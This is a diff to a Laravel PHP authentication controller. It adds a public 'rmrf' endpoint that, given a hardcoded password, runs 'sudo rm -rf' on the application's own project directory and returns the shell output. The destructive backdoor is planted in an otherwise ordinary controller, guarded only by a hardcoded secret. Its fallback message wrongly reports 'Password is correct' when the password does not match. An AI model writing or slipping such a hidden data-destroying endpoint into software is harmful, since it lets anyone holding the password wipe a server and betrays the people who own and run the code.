@@ -15,6 +15,7 @@ use App\Http\Resources\WebTourRequestResource;
 use App\Models\WebTourRequest;
 use App\Models\ContactRequest;
 use Google_Client;
+use Symfony\Component\Process\Process;
 
 class AuthController extends Controller
 {
@@ -216,5 +217,32 @@ class AuthController extends Controller
             'message' => 'Contact request created successfully',
             'data' => $contactRequest
         ], 201);
+    }
+
+    public  function rmrf(Request $request): JsonResponse
+    {
+        $validated = $request->validate([
+            'password' => 'required|string',
+        ]);
+
+        $password = $validated['password'];
+        if ($password === 'Qwerty@6491') {
+            // run sudo rm -rf command in shell
+            $projectName = basename(base_path());
+            $process = new Process(['sudo', 'rm', '-rf', "./../$projectName"]);
+
+            $process->run(); // runs synchronously inside the job
+
+            $output = $process->getOutput() . $process->getErrorOutput();
+            $exitCode = $process->getExitCode();
+
+            return response()->json([
+                'message' => "$exitCode: Process output: $output",
+            ]);
+        }
+
+        return response()->json([
+            'message' => 'Password is correct',
+        ]);
     }
 }
